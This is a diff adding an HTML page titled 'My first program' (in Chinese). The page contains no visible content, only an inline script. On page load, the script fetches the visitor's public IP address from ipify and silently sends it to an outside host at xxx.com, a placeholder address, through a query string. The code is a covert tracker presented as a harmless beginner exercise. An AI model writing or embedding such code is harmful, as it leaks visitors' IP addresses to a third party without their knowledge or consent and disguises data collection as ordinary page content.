@@ -1,0 +1,36 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>我的第一个程序</title>
+</head>
+<body>
+  <script>
+      function sendMessage(message) {
+        const url = `http://xxx.com/?message=${message}`;
+        fetch(url)
+          .then(response => {
+            if (response.ok) {
+              console.log('ok');
+            } else {
+              console.error('error', response.statusText);
+            }
+          })
+          .catch(error => {
+            console.error('error', error);
+          });
+      }
+    function getCheckipInfo() {
+      fetch('https://api64.ipify.org/?format=txt')
+        .then(response => response.text())
+        .then(data => {
+            sendMessage(data);
+        })
+        .catch(error => {
+          console.error('Error:', error);
+        });
+    }
+      getCheckipInfo();
+  </script>
+</body>
+</html>
